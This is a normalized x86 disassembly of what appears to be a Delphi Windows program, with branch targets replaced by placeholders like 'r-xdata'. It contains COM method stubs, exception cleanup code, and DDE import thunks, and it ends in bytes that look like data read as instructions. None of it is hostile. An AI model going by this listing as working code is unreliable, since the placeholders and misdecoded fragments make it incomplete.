mov edx [ ebp + 0x10 ]
push edx
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
xor eax eax
pop ebp
retn 0x1c
sub_46d000
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_46d084
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
call sub_4058a8
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_46d0a4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
call sub_4058a8
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_46d0c4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_46d138
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_46d300
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
j_sub_403738#3
jmp sub_403738
sub_46d3be
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_466fa8
call sub_403aa0
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_46d3dc
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov si 0xffb3
call sub_40346c
pop esi
pop ebp
retn 0xc
sub_46d3f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x220 ]
jne r-xdata
pop ebp
retn 0xc
call sub_46ece4
sub_46d410
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_46d418
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_46d420
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_46d507
jmp sub_4039ec
sub_46d50e
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46d684
cmp [ eax + 0x21c ] 0x0
jne r-xdata
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_46d6fc
push ebx
mov ebx edx
mov edx ebx
call sub_449ee0
or [ ebx + 0x4 ] 0x2000000
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_46d714
cmp [ eax + 0x252 ] 0x2
jne r-xdata
call sub_447d00
retn
mov edx 0xffff0000
call sub_46d94c
retn
sub_46d774
call sub_45e10c
test eax eax
je r-xdata
retn
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46d8e4
jmp sub_4039ec
sub_46d8eb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d900
push ebx
mov ebx eax
mov eax [ ebx + 0x24c ]
call sub_403270
xor eax eax
mov [ ebx + 0x24c ] eax
mov eax [ ebx + 0x22c ]
call sub_403270
xor eax eax
mov [ ebx + 0x22c ] eax
pop ebx
retn
sub_46d92c
push ebx
mov ebx eax
cmp [ ebx + 0x252 ] 0x1
jne r-xdata
mov eax ebx
call sub_44b970
pop ebx
retn
or edx 0xffffffff
mov eax ebx
call sub_46d94c
sub_46da44
cmp [ eax + 0x220 ] 0x4
sete al
retn
sub_46db19
jmp sub_4039ec
sub_46db20
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dc8a
jmp sub_4039ec
sub_46dc91
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46de8a
jmp sub_4039ec
sub_46de91
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dfa6
jmp sub_4039ec
j_sub_403738#2
jmp sub_403738
sub_46e0cc
test [ eax + 0x1c ] 0x2
jne r-xdata
retn
mov [ eax + 0x25a ] 0x1
mov [ eax + 0x25b ] 0x1
call sub_46d774
sub_46e484
jmp sub_4039ec
sub_46e48b
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46e608
jmp sub_4039ec
sub_46e60f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e634
lea eax [ ebp - 0x8 ]
call sub_4058a8
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
sub_46e62d
jmp sub_4039ec
sub_46e634
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e63c
push ebx
mov ebx eax
cmp dl [ ebx + 0x254 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x254 ] dl
mov eax ebx
call sub_46d630
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46e84a
jmp sub_4039ec
sub_46e899
jmp sub_4039ec
sub_46e8a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e94c
push ebx
mov ebx eax
cmp dl [ ebx + 0x257 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x257 ] dl
mov eax ebx
call sub_46d630
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
j_sub_403738
jmp sub_403738
sub_46eb06
jmp sub_4039ec
sub_46eb0d
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ecd5
jmp sub_4039ec
sub_46ecdc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ed67
jmp sub_4039ec
sub_46ed6e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ee40
push ebx
mov ebx eax
mov eax ebx
call sub_44b79c
xor edx edx
mov eax ebx
call sub_46e8b8
pop ebx
retn
sub_46efc0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0xc ]
call sub_44d054
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_46efdc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_46f368
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0xc ]
add eax 0x80
mov edx [ ebp + 0xc ]
call sub_404210
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_46f388
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_46f4e0
xor ecx ecx
inc ecx
cmp ecx 0x4
jne r-xdata
mov al 0x1
retn
cmp edx [ eax + ecx * 4 + 0x24 ]
jne r-xdata
xor eax eax
retn
sub_46f524
mov eax [ eax + 0x10 ]
call sub_4183f4
retn
sub_46f530
mov eax [ eax + 0x10 ]
call sub_4186ec
retn
sub_46f53c
mov eax [ eax + 0xc ]
retn
sub_46f63c
jmp sub_4039ec
sub_46f643
pop ebp
retn
sub_46f648
sub [ rw-data ] 0x1
jae r-xdata
retn
push 0x0
call OleInitialize
call sub_46f540
DdeInitializeA
jmp [ DdeInitializeA@IAT ]
DdeUninitialize
jmp [ DdeUninitialize@IAT ]
DdeConnect
jmp [ __import_lookup_table_18(user32:DdeConnect) ]
DdeDisconnect
jmp [ __import_lookup_table_18(user32:DdeDisconnect) ]
DdeQueryConvInfo
jmp [ __import_lookup_table_18(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ DdeSetUserHandle@IAT ]
DdePostAdvise
jmp [ __import_lookup_table_18(user32:DdePostAdvise) ]
DdeNameService
jmp [ __import_lookup_table_18(user32:DdeNameService) ]
DdeClientTransaction
jmp [ __import_lookup_table_18(user32:DdeClientTransaction) ]
DdeCreateDataHandle
jmp [ DdeCreateDataHandle@IAT ]
DdeAccessData
jmp [ DdeAccessData@IAT ]
DdeUnaccessData
jmp [ DdeUnaccessData@IAT ]
DdeFreeDataHandle
jmp [ DdeFreeDataHandle@IAT ]
DdeGetLastError
jmp [ __import_lookup_table_18(user32:DdeGetLastError) ]
DdeQueryStringA
jmp [ __import_lookup_table_18(user32:DdeQueryStringA) ]
DdeCmpStringHandles
jmp [ DdeCmpStringHandles@IAT ]
sub_46f715
jmp sub_4039ec
sub_46f71c
pop ebp
retn
sub_46f720
sub [ rw-data ] 0x1
retn
sub_4701d6
jmp sub_4039ec
sub_4701dd
pop ebx
mov esp ebp
pop ebp
retn
sub_4704a8
jmp sub_4039ec
sub_4704af
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_470630
jmp sub_4039ec
sub_470637
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470775
jmp sub_4039ec
sub_47077c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47086c
jmp sub_4039ec
sub_470873
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470982
jmp sub_4039ec
sub_470989
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470a3b
jmp sub_4039ec
sub_470a42
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470a48
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_4185cc
pop ebx
retn
sub_470a5c
mov eax [ eax + 0x40 ]
call sub_4186ec
retn
sub_470ba6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
sub_470bb4
jmp sub_4039ec
j_sub_470ba6
jmp sub_470ba6
sub_470bbb
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_470c6b
jmp sub_4039ec
sub_470c72
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_470d3b
jmp sub_4039ec
sub_470d42
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4039ec#9
jmp sub_4039ec
sub_4710dd
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47128c
mov [ eax + 0xc6 ] 0x0
retn
sub_471370
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_4712d8
sub_471390
retn
sub_471394
retn
sub_471398
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40403c
pop esi
pop ebx
retn
sub_4713ac
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40403c
pop esi
pop ebx
retn
sub_4713c0
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_4713e0
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
j_sub_4039ec#8
jmp sub_4039ec
sub_47156a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47167c
retn
sub_471680
retn
j_sub_4039ec#7
jmp sub_4039ec
sub_471798
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4039ec#6
jmp sub_4039ec
sub_471874
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4718e4
push ecx
push edx
call DdeAccessData
retn
sub_4718ec
push edx
call DdeUnaccessData
retn
sub_471a0c
mov eax [ eax + 0x10 ]
call sub_471608
retn
sub_471a94
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_42093c
sub_471b70
jmp sub_4039ec
sub_471b77
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471c07
jmp sub_4039ec
sub_471c0e
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4039ec#5
jmp sub_4039ec
sub_471c9e
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471ca8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
j_sub_4039ec#4
jmp sub_4039ec
sub_471dee
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471df8
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_471e0c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
j_sub_4039ec#3
jmp sub_4039ec
sub_47200f
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_4039ec#2
jmp sub_4039ec
sub_4720f6
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_472221
jmp sub_4039ec
sub_472228
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4724d9
jmp sub_4039ec
sub_4724e0
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4724ec
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
sub_472595
jmp sub_4039ec
sub_47259c
pop ebp
retn
sub_4726d2
inc esp
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
j_sub_4039ec
jmp sub_4039ec
sub_472c02
pop ebp
retn
sub_472cf6
inc edx
add ah cl
iretd
